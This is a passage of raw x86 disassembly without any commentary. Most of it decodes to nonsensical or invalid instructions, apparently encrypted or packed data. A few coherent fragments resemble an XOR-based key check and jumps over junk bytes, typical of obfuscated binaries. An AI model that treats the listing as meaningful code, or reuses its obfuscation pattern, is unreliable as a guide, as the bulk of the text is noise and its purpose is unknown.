  416763:	sahf   
  416764:	or     bl,BYTE PTR [ecx-0x51]
  416767:	pop    ss
  416768:	xchg   edx,eax
  416769:	or     BYTE PTR [ebx+0x64],al
  41676c:	xor    ecx,DWORD PTR [ecx]
  41676e:	cdq    
  41676f:	or     al,ah
  416771:	sbb    ebx,edi
  416773:	cmc    
  416774:	cmp    edx,DWORD PTR [esi+ebp*8-0x5c]
  416778:	cs popf 
  41677a:	(bad)  
  41677c:	shr    DWORD PTR ds:0xf0a51a23,1
  416782:	xor    ebp,DWORD PTR [esi+0x5d88a9eb]
  416788:	les    ebp,FWORD PTR [ebx+eax*2-0x9]
  41678c:	aam    0x82
  41678e:	into   
  41678f:	pop    edx
  416790:	sbb    edi,edx
  416792:	ss jle 0x4167ba
  416795:	(bad)  
  416797:	and    eax,0x7dfefe35
  41679c:	clc    
  41679d:	das    
  41679e:	add    bh,BYTE PTR [edx]
  4167a0:	push   0xffffffef
  4167a2:	js     0x4167ca
  4167a4:	retf   
  4167a5:	sub    BYTE PTR gs:[edi],0x95
  4167a9:	dec    DWORD PTR [esi]
  4167ab:	sbb    dl,BYTE PTR [esi+0x431e24f7]
  4167b1:	sub    DWORD PTR [ecx+0x32cfe523],eax
  4167b7:	cmp    BYTE PTR [ebx-0x6425e6b0],bl
  4167bd:	inc    edx
  4167be:	ror    BYTE PTR ds:0x418519f3,0x50
  4167c5:	in     eax,0xa4
  4167c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167c8:	repz shr BYTE PTR [eax+0x7f6dd83c],cl
  4167cf:	mov    esi,DWORD PTR [edi-0x46]
  4167d2:	call   0xea703881
  4167d7:	ficom  WORD PTR ds:0x24ddd338
  4167dd:	sub    bh,0xc9
  4167e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167e1:	pop    ss
  4167e2:	int3   
  4167e3:	std    
  4167e4:	loope  0x4167dd
  4167e6:	pop    ecx
  4167e7:	popf   
  4167e8:	mov    BYTE PTR [edi+0x51],cl
  4167eb:	scas   eax,DWORD PTR es:[edi]
  4167ec:	call   0xc4ca:0x68410c79
  4167f3:	jmp    0xe25d:0x5d969515
  4167fa:	aas    
  4167fb:	and    eax,0x8b018967
  416800:	inc    ebp
  416801:	clc    
  416802:	jmp    0x41731f
  416807:	jmp    0x416abf
  41680c:	ds rcl esi,1
  41680f:	int3   
  416810:	(bad)  
  416812:	retf   0x7ed1
  416815:	xchg   ebx,eax
  416816:	aam    0x3d
  416818:	lods   eax,DWORD PTR ds:[esi]
  416819:	imul   eax,esi,0x42
  41681c:	jbe    0x416841
  41681e:	jg     0x416898
  416820:	xchg   ebp,eax
  416821:	jle    0x41689b
  416823:	js     0x4167b4
  416825:	addr16 and eax,0x99a948ae
  41682b:	inc    edi
  41682c:	outs   dx,BYTE PTR ds:[esi]
  41682d:	pop    edx
  41682e:	jl     0x416803
  416830:	les    ecx,FWORD PTR [eax+0x5d016ad3]
  416836:	dec    esp
  416837:	mov    esp,0xa9721553
  41683c:	adc    ebp,ecx
  41683e:	leave  
  41683f:	pop    ds
  416840:	shl    BYTE PTR cs:[eax-0x59],0xd0
  416845:	enter  0x563f,0x58
  416849:	mov    dl,0x46
  41684b:	imul   esi,ebp,0xffffff97
  41684e:	xor    DWORD PTR [eax],edi
  416850:	jo     0x416813
  416852:	adc    eax,0x576cedfa
  416857:	icebp  
  416858:	lds    esp,FWORD PTR [ebx-0x76]
  41685b:	or     eax,0xfb59b76
  416860:	add    BYTE PTR fs:[ecx+0x19afac50],0xe9
  416868:	call   0xa196:0xe4d5ecf4
  41686f:	je     0x4168e7
  416871:	cli    
  416872:	sbb    DWORD PTR [ecx-0x35],0x67
  416876:	dec    ebp
  416877:	(bad)  
  416878:	loop   0x416819
  41687a:	or     eax,0xd903b33b
  41687f:	nop
  416880:	jmp    0x1371:0x15aa1083
  416887:	and    eax,0xc93fe1be
  41688c:	add    ah,BYTE PTR [edi+0xa]
  41688f:	out    0xdc,eax
  416891:	ds and ebp,0xd29c8b0d
  416898:	sahf   
  416899:	aad    0x82
  41689b:	pop    eax
  41689c:	leave  
  41689d:	adc    dl,al
  41689f:	dec    edx
  4168a0:	out    0xa0,eax
  4168a2:	leave  
  4168a3:	es (bad) 
  4168a5:	bound  ebp,QWORD PTR [ecx]
  4168a7:	fstp   DWORD PTR [ebx-0x1ecfdbc9]
  4168ad:	enter  0x452d,0x72
  4168b1:	mov    ah,0x78
  4168b3:	jl     0x416859
  4168b5:	or     al,0xcc
  4168b7:	sahf   
  4168b8:	into   
  4168b9:	in     al,0x5c
  4168bb:	jecxz  0x4168bb
  4168bd:	enter  0x6b16,0xef
  4168c1:	push   es
  4168c2:	lea    edi,ds:0xc9914dd0
  4168c8:	add    eax,0xa0b1007d
  4168cd:	adc    edx,DWORD PTR [ecx]
  4168cf:	repnz shr BYTE PTR [edx],1
  4168d2:	mov    al,BYTE PTR [esi+0x3c95ff12]
  4168d8:	jmp    0x41686e
  4168da:	pop    ebp
  4168db:	enter  0x9be4,0xe9
  4168df:	add    dh,bh
  4168e1:	mov    ebp,0x7c94043c
  4168e6:	cmp    BYTE PTR [edx-0x2a],ah
  4168e9:	cmp    esi,DWORD PTR [esi+edx*4]
  4168ec:	(bad)  
  4168ed:	rcr    DWORD PTR [ebp-0x58],1
  4168f0:	xor    al,0xf
  4168f2:	or     eax,0x6706252f
  4168f7:	loope  0x416950
  4168f9:	pusha  
  4168fa:	lea    ecx,[ebp-0x4149fe93]
  416900:	jo     0x41694f
  416902:	and    al,0x12
  416904:	out    0x15,eax
  416906:	adc    ax,WORD PTR [eax-0x59]
  41690a:	lods   eax,DWORD PTR ds:[esi]
  41690b:	repz adc ebp,esi
  41690e:	sub    DWORD PTR [ecx-0x63c3457f],esi
  416914:	mov    ds:0xe1d5d120,al
  416919:	mov    ds:0xb969ec49,eax
  41691e:	jne    0x4168fc
  416920:	sbb    al,0x36
  416922:	call   0x68d71d1a
  416927:	test   DWORD PTR [ecx-0x31],0xa61071ca
  41692e:	lods   al,BYTE PTR ds:[esi]
  41692f:	sub    al,0x36
  416931:	push   esi
  416932:	idiv   BYTE PTR [eax]
  416934:	push   ecx
  416935:	adc    ebx,edi
  416937:	dec    esp
  416939:	sar    DWORD PTR [esi+0x721a0ba0],cl
  41693f:	loope  0x4168cb
  416941:	jp     0x416925
  416943:	cmp    eax,0x819e864d
  416948:	xchg   ecx,eax
  416949:	cmp    esi,esi
  41694b:	cmp    al,0x5b
  41694d:	mov    eax,ds:0x7877c999
  416952:	or     dl,BYTE PTR [edx-0x76]
  416955:	jp     0x416961
  416957:	ins    BYTE PTR es:[edi],dx
  416958:	call   0xbedf51b
  41695d:	into   
  41695e:	and    al,0xf1
  416960:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416961:	sbb    eax,0x1abdde31
  416966:	sub    bl,BYTE PTR [edi]
  416968:	test   BYTE PTR [ecx+0x78],cl
  41696b:	cwde   
  41696c:	mov    ebx,0xf3fcce00
  416971:	in     al,dx
  416972:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416973:	popa   
  416974:	idiv   BYTE PTR [eax]
  416976:	xor    eax,0x449583a4
  41697b:	adc    al,0xf9
  41697d:	adc    al,0x2b
  41697f:	xchg   edi,eax
  416980:	(bad)  
  416981:	pop    ebx
  416982:	add    al,0x6b
  416984:	add    edi,ebx
  416986:	and    DWORD PTR [edx],ecx
  416988:	and    BYTE PTR [edx*8+0x3fca08d2],al
  41698f:	sti    
  416990:	xlat   BYTE PTR ds:[ebx]
  416991:	adc    ebx,DWORD PTR [edx]
  416993:	lods   al,BYTE PTR ds:[esi]
  416994:	out    dx,eax
  416995:	(bad)  [esi]
  416997:	test   BYTE PTR [eax],dl
  416999:	mov    cl,0x3a
  41699b:	inc    ebx
  41699c:	jge    0x4169db
  41699e:	jns    0x416963
  4169a0:	bound  esi,QWORD PTR ds:0x76e267d
  4169a6:	jg     0x41695e
  4169a8:	popf   
  4169a9:	push   edx
  4169aa:	jmp    0xbb26:0x4ce6d0dc
  4169b1:	mov    edi,0x38755e85
  4169b6:	jo     0x416998
  4169b8:	gs int 0x6b
  4169bb:	out    0x2d,eax
  4169bd:	jmp    0xd364:0xdb53f8d1
  4169c4:	add    eax,0xc2afac55
  4169c9:	adc    dl,dl
  4169cb:	sahf   
  4169cc:	jmp    0xb13d:0xb12c8951
  4169d3:	jne    0x416a34
  4169d5:	push   0xce06f40b
  4169da:	shr    BYTE PTR [eax+0x32],1
  4169dd:	shr    BYTE PTR ds:0x3dfbab43,cl
  4169e3:	push   ecx
  4169e4:	fisub  WORD PTR [ebx]
  4169e6:	fwait
  4169e7:	jb     0x4169f0
  4169e9:	adc    ch,ah
  4169eb:	call   0xa44:0x8e15f9b7
  4169f2:	and    eax,DWORD PTR [ebx-0x5febbe67]
  4169f8:	shl    BYTE PTR [esi+0x1ae4d6ab],1
  4169fe:	cmp    al,0xbb
  416a00:	mov    edx,0x18c46b49
  416a05:	ss es aas 
  416a08:	jp     0x416a7d
  416a0a:	jo     0x4169dd
  416a0c:	xor    eax,0xc90243ef
  416a11:	xor    DWORD PTR [ecx-0x45580f34],ebx
  416a17:	sub    eax,0xec618720
  416a1c:	bound  eax,QWORD PTR [ebx-0x10f94002]
  416a22:	dec    esp
  416a23:	mov    edx,0x88b45cd9
  416a28:	xor    DWORD PTR [esi-0x604327a6],ecx
  416a2e:	out    dx,al
  416a2f:	shr    ecx,cl
  416a31:	popf   
  416a32:	jns    0x416a03
  416a34:	ret    0x6bf5
  416a37:	das    
  416a38:	pop    ebx
  416a39:	(bad)  
  416a3a:	jge    0x4169c6
  416a3c:	ja     0x416a17
  416a3e:	cmp    eax,0x37c6143d
  416a43:	mov    fs,eax
  416a45:	out    0xce,al
  416a47:	push   0xffffffb2
  416a49:	pop    ebx
  416a4a:	jbe    0x416a58
  416a4c:	inc    ebx
  416a4d:	add    BYTE PTR [ebp+edi*2-0x6f],dh
  416a51:	jns    0x416a00
  416a53:	test   edx,ecx
  416a55:	mov    al,ds:0x6d3d029f
  416a5a:	add    esp,edi
  416a5c:	call   0x6f3b:0x971422
  416a63:	out    0x51,al
  416a65:	call   0xafdd0c1a
  416a6a:	sahf   
  416a6b:	sahf   
  416a6c:	outs   dx,BYTE PTR ds:[esi]
  416a6d:	jp     0x416aa2
  416a6f:	jecxz  0x416a76
  416a71:	es sahf 
  416a73:	sub    BYTE PTR [ecx-0x6f811fcf],0xb6
  416a7a:	imul   esi,DWORD PTR [eax-0x541a7dc0],0xc0e1c4e4
  416a84:	clc    
  416a85:	les    esp,FWORD PTR [eax-0x371b4bde]
  416a8b:	es shl ch,cl
  416a8e:	add    BYTE PTR [esi-0x75],0x35
  416a92:	push   0xffffffb4
  416a94:	out    dx,al
  416a95:	fdivr  QWORD PTR [edi-0x3c1ff22c]
  416a9b:	(bad)  
  416a9c:	(bad)  
  416a9d:	push   cs
  416a9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a9f:	xchg   edx,eax
  416aa0:	not    DWORD PTR [ecx-0xe]
  416aa3:	addr16 pusha 
  416aa5:	add    eax,0x8061c1b9
  416aaa:	addr16 test eax,0x27ec32cf
  416ab0:	dec    edi
  416ab1:	jmp    0x416ae2
  416ab3:	mov    edx,0x780c5e79
  416ab8:	inc    ebx
  416ab9:	mov    edi,0x5ef6e9c6
  416abe:	push   ebx
  416abf:	mov    eax,DWORD PTR [ebp-0x4]
  416ac2:	jmp    0x416d7a
  416ac7:	rol    dl,1
  416ac9:	(bad)  
  416aca:	iret   
  416acb:	fcmovbe st,st(5)
  416acd:	fcmovne st,st(1)
  416acf:	mov    eax,0x664ff75
  416ad4:	mov    edi,0x209378cd
  416ad9:	jg     0x416b53
  416adb:	xchg   ebp,eax
  416adc:	jle    0x416b56
  416ade:	js     0x416ab8
  416ae0:	mov    dl,0xc9
  416ae2:	adc    al,0x81
  416ae4:	push   ds
  416ae5:	cmp    ebp,DWORD PTR [edx+edx*1]
  416ae8:	jns    0x416ad3
  416aea:	push   edx
  416aeb:	pushf  
  416aec:	and    esp,DWORD PTR [esi+0x7987bb3a]
  416af2:	jo     0x416b02
  416af4:	test   al,0xc
  416af6:	and    eax,0x778cd5fe
  416afb:	fwait
  416afc:	(bad)  
  416afd:	iret   
  416afe:	bound  ebx,QWORD PTR [edx-0x4e]
  416b01:	pop    ebp
  416b02:	or     BYTE PTR [eax-0x439ceea7],cl
  416b08:	mov    bl,0xd2
  416b0a:	jnp    0x416a96
  416b0c:	xlat   BYTE PTR ds:[ebx]
  416b0d:	enter  0xf44,0x8
  416b11:	pop    edi
  416b12:	int    0x86
  416b14:	dec    ebx
  416b15:	xor    BYTE PTR [ebx+0x5c],bl
  416b18:	arpl   bp,bp
  416b1a:	mov    eax,ds:0x5c87ab0d
  416b1f:	shl    BYTE PTR [eax],cl
  416b21:	lods   al,BYTE PTR ds:[esi]
  416b22:	inc    ebx
  416b23:	mov    ds:0x2679c125,al
  416b28:	dec    ebp
  416b29:	sub    eax,0x82ff4ca4
  416b2e:	rcl    DWORD PTR [ebx+0x54],0x4
  416b32:	add    al,0x18
  416b34:	shr    DWORD PTR ds:0x7557d240,1
  416b3a:	ins    BYTE PTR es:[edi],dx
  416b3b:	xor    BYTE PTR [ecx+esi*4],al
  416b3e:	fstp   DWORD PTR [eax-0x64]
  416b41:	iret   
  416b42:	(bad)  
  416b43:	pop    edi
  416b44:	dec    edi
  416b45:	or     bl,BYTE PTR [edi+ecx*8+0x79d03016]
  416b4c:	out    dx,eax
  416b4d:	mov    bl,0x3a
  416b4f:	dec    esi
  416b50:	cdq    
  416b51:	mov    edi,0x8d6d0978
  416b56:	jmp    0x416b6a
  416b58:	cmp    al,0x16
  416b5a:	sub    BYTE PTR [ecx+ebp*4],bh
  416b5d:	add    edx,DWORD PTR [edi-0x150f8d05]
  416b63:	xor    DWORD PTR [esi],edi
  416b65:	jge    0x416b51
  416b67:	outs   dx,BYTE PTR ds:[esi]
  416b68:	ds call 0xa619b277
  416b6e:	lods   eax,DWORD PTR ds:[esi]
  416b6f:	fwait
  416b70:	test   eax,0x70161e65
  416b75:	pop    ds
  416b76:	push   esi
  416b77:	sub    BYTE PTR [eax],bh
  416b79:	cmp    eax,0x9a788983
  416b7e:	mov    eax,fs:0xe9adf1aa
  416b84:	aam    0x73
  416b86:	nop
  416b87:	pop    edi
  416b88:	(bad)  
  416b89:	int    0xf9
  416b8b:	xchg   ecx,eax
  416b8c:	mov    eax,ds:0x2dcfcc24
  416b91:	fldenv cs:[eax]
  416b94:	cmp    al,0x1
  416b96:	ret    
  416b97:	hlt    
  416b98:	adc    DWORD PTR [eax],0xa0c3ad63
  416b9e:	and    esi,DWORD PTR [esi+0x13379b27]
  416ba4:	bound  edi,QWORD PTR [eax+0x3]
  416ba7:	fnstcw WORD PTR [ecx]
  416ba9:	push   ecx
  416baa:	cmc    
  416bab:	sbb    dl,BYTE PTR [edx-0x40]
  416bae:	add    BYTE PTR [ecx+0x4d7def8e],dl
  416bb4:	ficom  DWORD PTR [edx+0x68b72bbb]
  416bba:	push   ss
  416bbb:	dec    ecx
  416bbc:	xchg   edx,eax
  416bbd:	mov    bl,bl
  416bbf:	cmp    al,0xa4
  416bc1:	add    BYTE PTR [edx-0x4],dh
  416bc4:	mov    cl,0x34
  416bc6:	pop    ds
  416bc7:	pop    ecx
  416bc8:	in     eax,dx
  416bc9:	out    0x3f,eax
  416bcb:	sahf   
  416bcc:	popa   
  416bcd:	mov    fs,WORD PTR gs:[ebx]
  416bd0:	xchg   ebx,eax
  416bd1:	cmp    ecx,DWORD PTR [edi+esi*2+0x42]
  416bd5:	pop    eax
  416bd6:	fs mov ecx,0x6b190b03
  416bdc:	xchg   esp,eax
  416bdd:	push   0x51e99139
  416be2:	leave  
  416be3:	loopne 0x416ba8
  416be5:	jmp    0x7e49f932
  416bea:	repz inc edi
  416bec:	xor    bl,BYTE PTR [esi+0x6]
  416bef:	sbb    dh,BYTE PTR [edx+0x6b]
  416bf2:	xchg   ebp,eax
  416bf3:	push   0x579746bb
  416bf8:	rcr    DWORD PTR [eax+0x75dafbc3],1
  416bfe:	(bad)  
  416bff:	stos   BYTE PTR es:[edi],al
  416c00:	sar    DWORD PTR [ecx+0x50],1
  416c03:	(bad)  
  416c04:	mov    ebx,0x86e39b91
  416c09:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c0b:	lods   eax,DWORD PTR ds:[esi]
  416c0c:	push   ebx
  416c0d:	push   cs
  416c0e:	fwait
  416c0f:	inc    edi
  416c10:	nop
  416c11:	cmp    cl,dl
  416c13:	test   BYTE PTR [esi+0x3f],al
  416c16:	mov    dl,0xba
  416c18:	ret    0x34f2
  416c1b:	add    BYTE PTR [edx+edi*1],bh
  416c1e:	dec    esi
  416c1f:	adc    edx,DWORD PTR [ebx+edx*4+0x63]
  416c23:	sub    eax,0x5335862a
  416c28:	scas   al,BYTE PTR es:[edi]
  416c29:	in     al,0x78
  416c2b:	test   eax,0x6ba8ce7c
  416c30:	data16 in al,0xd5
  416c33:	jle    0x416c58
  416c35:	push   esi
  416c36:	mov    ss,WORD PTR [ebp-0x29]
  416c39:	add    eax,DWORD PTR [ebx-0x40ff6524]
  416c3f:	or     ebx,esp
  416c41:	inc    ecx
  416c42:	and    DWORD PTR [ecx+esi*4+0x3],0x3c
  416c47:	jno    0x416c47
  416c49:	test   DWORD PTR [edi],0x1f91727f
  416c4f:	pusha  
  416c50:	stos   DWORD PTR es:[edi],eax
  416c51:	and    dl,BYTE PTR [ebx]
  416c53:	ds push es
  416c55:	mov    edx,0x95bddaad
  416c5a:	loopne 0x416c36
  416c5c:	push   ebp
  416c5d:	push   ebp
  416c5e:	mov    ?,ebp
  416c60:	inc    esp
  416c61:	pop    ss
  416c62:	pop    ss
  416c63:	push   eax
  416c64:	dec    esi
  416c65:	fcomip st,st(7)
  416c67:	jp     0x416c9d
  416c69:	mov    ss,WORD PTR [esi+0x57]
  416c6c:	icebp  
  416c6d:	retf   0x76d9
  416c70:	fwait
  416c71:	js     0x416ca1
  416c73:	xchg   ebp,eax
  416c74:	jle    0x416c7d
  416c76:	pop    esp
  416c77:	in     al,0xce
  416c79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c7a:	iret   
  416c7b:	mul    DWORD PTR [esi+0x48]
  416c7e:	aas    
  416c7f:	imul   BYTE PTR [edx]
  416c81:	call   0xb5606eab
  416c86:	ret    0xf5ba
  416c89:	shl    DWORD PTR [ecx+0x28b5608c],1
  416c8f:	jle    0x416ca6
  416c91:	inc    edi
  416c92:	jg     0x416cfa
  416c94:	rcl    BYTE PTR [edi],cl
  416c96:	arpl   ax,sp
  416c98:	lahf   
  416c99:	shl    BYTE PTR [esi+0x21],cl
  416c9c:	jno    0x416c74
  416c9e:	jb     0x416cb7
  416ca0:	mov    cl,0x4b
  416ca2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ca3:	mov    bl,0x27
  416ca5:	xor    eax,0xd86f2592
  416caa:	aad    0x3d
  416cac:	push   0x6c5ae0e9
  416cb1:	adc    al,cl
  416cb3:	pushf  
  416cb4:	daa    
  416cb5:	inc    esi
  416cb6:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416cb8:	sbb    al,0xb3
  416cba:	jmp    0x29d0:0x2b360271
  416cc1:	into   
  416cc2:	std    
  416cc3:	mov    ebp,cs
  416cc5:	cmp    dh,bl
  416cc7:	xchg   esi,eax
  416cc8:	cmp    eax,0x4caa2865
  416ccd:	adc    DWORD PTR ds:0x8b0f4ec4,ecx
  416cd3:	fsubr  DWORD PTR [edx]
  416cd5:	sbb    al,0xc9
  416cd7:	mov    ecx,0x32a54557
  416cdc:	jecxz  0x416cfb
  416cde:	sub    cl,0x94
  416ce1:	outs   dx,DWORD PTR ds:[esi]
  416ce2:	pop    ds
  416ce3:	adc    BYTE PTR [ebp-0x7e],dl
  416ce6:	cwde   
  416ce7:	cmp    ecx,edi
  416ce9:	je     0x416ce2
  416ceb:	pop    ebx
  416cec:	cdq    
  416ced:	dec    ebx
  416cee:	ins    DWORD PTR es:[edi],dx
  416cef:	add    BYTE PTR [ecx+0x1f],ch
  416cf2:	std    
  416cf3:	enter  0x4002,0x96
  416cf7:	sbb    DWORD PTR [edi+eax*1-0x7e],eax
  416cfb:	pop    eax
  416cfc:	and    edi,ebx
  416cfe:	mov    ds:0x8ef21611,al
  416d03:	mov    bl,0x2
  416d05:	out    0x89,al
  416d07:	dec    esi
  416d08:	xor    ch,BYTE PTR [ecx-0x7e]
  416d0b:	into   
  416d0c:	cli    
  416d0d:	mov    dl,0x52
  416d0f:	jnp    0x416d13
  416d11:	ins    DWORD PTR es:[edi],dx
  416d12:	inc    DWORD PTR [ebx-0x6fea6689]
  416d18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d19:	pusha  
  416d1a:	xlat   BYTE PTR ds:[ebx]
  416d1b:	lods   eax,DWORD PTR ds:[esi]
  416d1c:	mov    ds:0xe6f70c0c,eax
  416d21:	jecxz  0x416d3c
  416d23:	lock jae 0x416ce7
  416d26:	mov    DWORD PTR [eax],ebx
  416d28:	push   ds
  416d29:	and    DWORD PTR [esi+0x1c],eax
  416d2c:	int3   
  416d2d:	gs rcl ebx,1
  416d30:	xchg   ebp,eax
  416d31:	jns    0x416cdb
  416d33:	inc    esp
  416d34:	jecxz  0x416d83
  416d36:	shl    ah,0xb9
  416d39:	test   DWORD PTR ds:0x926ab3fe,esi
  416d3f:	out    0x54,al
  416d41:	lods   al,BYTE PTR ds:[esi]
  416d42:	dec    ebp
  416d43:	jbe    0x416db6
  416d45:	xor    BYTE PTR [edx-0x6e883cd4],dh
  416d4b:	mov    dl,0xe
  416d4d:	mov    eax,gs:0x3f4b8bfb
  416d53:	cld    
  416d54:	jmp    0x6eb2:0xff1e68bc
  416d5b:	xor    BYTE PTR [eax],al
  416d5d:	sub    al,0x6c
  416d5f:	jbe    0x416d26
  416d61:	push   ebp
  416d62:	push   edx
  416d63:	or     eax,0x33a68631
  416d68:	leave  
  416d69:	lea    eax,[ecx+eiz*4+0x3]
  416d6d:	aas    
  416d6e:	adc    BYTE PTR [ecx+0x19],al
  416d71:	xchg   ecx,eax
  416d72:	push   edx
  416d73:	push   ebp
  416d74:	xchg   ebx,eax
  416d75:	or     eax,0x93a00cf8
  416d7a:	mov    ecx,DWORD PTR [ebp+0x10]
  416d7d:	xor    eax,edi
  416d7f:	add    eax,esi
  416d81:	cmp    eax,ecx
  416d83:	jne    0x41731c
  416d89:	mov    eax,DWORD PTR [ebp-0x4]
  416d8c:	xor    eax,edi
  416d8e:	add    eax,esi
  416d90:	mov    ds:0x41eb6a,eax
  416d95:	mov    eax,DWORD PTR [ebp-0x4]
  416d98:	xor    eax,edi
  416d9a:	jmp    0x417052
  416d9f:	xlat   BYTE PTR ds:[ebx]
  416da0:	cmp    eax,0xd9dac7cc
  416da5:	fcmovne st,st(5)
  416da7:	push   ecx
  416da8:	call   0x995f:0x139b1efb
  416daf:	sub    BYTE PTR ds:0x7e95787f,ah
  416db5:	js     0x416e2f
  416db7:	add    eax,0x34c68990
  416dbc:	in     eax,dx
  416dbd:	cwde   
  416dbe:	sbb    eax,0x563c536f
  416dc3:	dec    eax
  416dc4:	leave  
  416dc5:	add    DWORD PTR [edi+eax*2-0x75],0xfffffff9
  416dca:	stc    
  416dcb:	mov    eax,0x6d0803f0
  416dd0:	retf   
  416dd1:	(bad)  
  416dd2:	ret    0x549a
  416dd5:	inc    eax
  416dd6:	mov    al,ds:0x27da47ec
  416ddb:	test   eax,0x75a926a9
  416de0:	in     eax,dx
  416de1:	nop
  416de2:	jne    0x416dcb
  416de4:	aam    0x73
  416de6:	loop   0x416e16
  416de8:	xor    DWORD PTR [edx-0x199e9104],edx
  416dee:	sbb    ebx,eax
  416df0:	data16 jp 0x416dbe
  416df3:	dec    ebp
  416df4:	pop    ebx
  416df5:	xor    DWORD PTR [ecx+0x2e5e7ebb],0xffffff94
  416dfc:	mov    bl,0xa4
  416dfe:	add    eax,0x719df73
  416e03:	jmp    0x6125:0x4c8d6d46
  416e0a:	sub    ebx,DWORD PTR ds:0x836ceb7a
  416e10:	fs inc edx
  416e12:	mov    DWORD PTR [esi-0x28],eax
  416e15:	push   ds
  416e16:	cwde   
  416e17:	add    eax,ecx
  416e19:	jp     0x416e2c
  416e1b:	cmp    esi,DWORD PTR ds:0x9620c788
  416e21:	xor    eax,0x4b982e6e
  416e26:	popa   
  416e27:	jno    0x416e46
  416e29:	or     BYTE PTR [edi+ebp*4],0xbd
  416e2d:	les    eax,FWORD PTR [eax-0x42]
  416e30:	fsubr  st(4),st
  416e32:	sub    eax,0x4b92266d
  416e37:	retf   
  416e38:	mov    al,ss:0xe6ab5a8b
  416e3e:	cli    
  416e3f:	mov    cl,0x6c
  416e41:	pop    ds
  416e42:	lock mov gs,WORD PTR [ebx+0x72]
  416e46:	jne    0x416e11
  416e48:	ds pop ecx
  416e4a:	stc    
  416e4b:	sub    esp,DWORD PTR [ebx]
  416e4d:	jae    0x416eb9
  416e4f:	stos   BYTE PTR es:[edi],al
  416e50:	adc    al,0x90
  416e52:	adc    eax,0x2a157567
  416e57:	push   0x30bce6b7
  416e5c:	scas   eax,DWORD PTR es:[edi]
  416e5d:	push   eax
  416e5e:	dec    ecx
  416e5f:	xchg   ebx,eax
  416e60:	pop    edx
  416e61:	mov    ecx,0xac0faee4
  416e66:	lods   al,BYTE PTR es:[esi]
  416e68:	iret   
  416e69:	dec    ebp
  416e6a:	ret    0x54c7
  416e6d:	ret    
  416e6e:	add    eax,0x722e3e4d
  416e73:	or     ebx,DWORD PTR [ebp-0x1d]
  416e76:	adc    ebx,DWORD PTR [ebx-0x8be9efa]
  416e7c:	imul   ecx,DWORD PTR [esi-0x286253e3],0x83c75f0b
  416e86:	push   0x79e313ce
  416e8b:	jmp    0x96409a20
  416e90:	outs   dx,BYTE PTR ds:[esi]
  416e91:	popa   
  416e92:	pop    es
  416e93:	xchg   esp,eax
  416e94:	jmp    0x416ee4
  416e96:	sbb    BYTE PTR [edi-0x51766f5c],0x67
  416e9d:	and    dl,BYTE PTR [ebx]
  416e9f:	in     al,dx
  416ea0:	pop    ds
  416ea1:	adc    ebp,DWORD PTR [eax-0x45]
  416ea4:	dec    esp
  416ea5:	inc    ecx
  416ea6:	test   eax,0x757105da
  416eab:	ins    DWORD PTR es:[edi],dx
  416eac:	(bad)  
  416ead:	pop    esp
  416eae:	sub    al,0x6e
  416eb0:	mov    gs,WORD PTR [esp+ecx*4+0x75]
  416eb4:	mov    cl,0x7b
  416eb6:	inc    ecx
  416eb7:	jle    0x416ea6
  416eb9:	loopne 0x416f02
  416ebb:	outs   dx,DWORD PTR ds:[esi]
  416ebc:	pop    ecx
  416ebd:	inc    edx
  416ebe:	sub    BYTE PTR [eax+0xb24576b],0x39
  416ec5:	jb     0x416e53
  416ec7:	fstp   DWORD PTR [edi-0x9875975]
  416ecd:	fmul   DWORD PTR [esi-0x75]
  416ed0:	add    BYTE PTR [eax+0x19],ch
  416ed3:	ss xor al,0x4a
  416ed6:	shr    DWORD PTR [edx],0xe9
  416ed9:	fist   WORD PTR [esp+eax*8+0x36]
  416edd:	xor    al,0xc8
  416edf:	sbb    DWORD PTR [esi],edi
  416ee1:	mov    esp,0x54c4c7e2
  416ee6:	adc    al,bl
  416ee8:	jp     0x416ed8
  416eea:	cs mov gs,eax
  416eed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416eee:	jmp    0x4eb52cbc
  416ef3:	adc    eax,DWORD PTR [ebx+edi*8+0x754ad2cd]
  416efa:	in     eax,0xb9
  416efc:	sbb    al,0x9f
  416efe:	xchg   ebp,eax
  416eff:	jge    0x416ec1
  416f01:	lahf   
  416f02:	cmp    esp,ebx
  416f04:	fstp   QWORD PTR [eax-0x4a176827]
  416f0a:	push   edi
  416f0b:	arpl   WORD PTR [esi-0x2866b74b],bx
  416f11:	(bad)  
  416f13:	ins    BYTE PTR es:[edi],dx
  416f14:	cmp    bl,BYTE PTR [ebp+0x72]
  416f17:	pop    ebp
  416f18:	gs pop esi
  416f1a:	xor    al,0x4d
  416f1c:	and    edi,DWORD PTR [ebx]
  416f1e:	xor    ecx,DWORD PTR [edx]
  416f20:	pop    esp
  416f21:	stos   DWORD PTR es:[edi],eax
  416f22:	mov    al,ds:0xe7e7ac20
  416f27:	repz inc ebp
  416f29:	ret    0xc7a
  416f2c:	enter  0x103a,0x23
  416f30:	aad    0xbe
  416f32:	cld    
  416f33:	xlat   BYTE PTR ds:[ebx]
  416f34:	sahf   
  416f35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f36:	fsub   st,st(4)
  416f38:	jns    0x416f66
  416f3a:	xchg   esi,eax
  416f3b:	mov    ch,0x89
  416f3d:	push   edx
  416f3e:	bound  ebx,QWORD PTR [edi+0x6258da73]
  416f44:	test   BYTE PTR [ebp+0x1b1b132f],cl
  416f4a:	fdiv   QWORD PTR [ebp-0x59215d03]
  416f50:	in     eax,dx
  416f51:	pop    ds
  416f52:	xchg   esp,eax
  416f53:	xor    BYTE PTR ss:[ebx+0x5310fce3],ch
  416f5a:	mov    ds:0x5d72ff65,eax
  416f5f:	lds    edi,FWORD PTR [ecx+0x35]
  416f62:	js     0x416f0e
  416f64:	xor    DWORD PTR [edi],ebp
  416f66:	lea    edx,[ecx]
  416f68:	pop    ebp
  416f69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f6a:	jle    0x416fb5
  416f6c:	mov    edx,0x634a139a
